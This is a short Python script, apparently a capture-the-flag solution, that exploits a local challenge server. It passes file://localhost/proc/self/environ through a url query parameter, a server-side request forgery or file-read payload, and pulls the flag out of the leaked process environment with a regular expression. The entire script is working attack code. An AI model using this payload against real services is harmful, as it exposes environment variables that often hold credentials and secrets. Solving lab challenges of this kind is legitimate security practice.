import re
import requests

URL = "http://localhost:4989/"

res = requests.get(f"{URL}?url=file://localhost/proc/self/environ")

print(re.findall(r"ctf4b{.*}", res.text)[0])
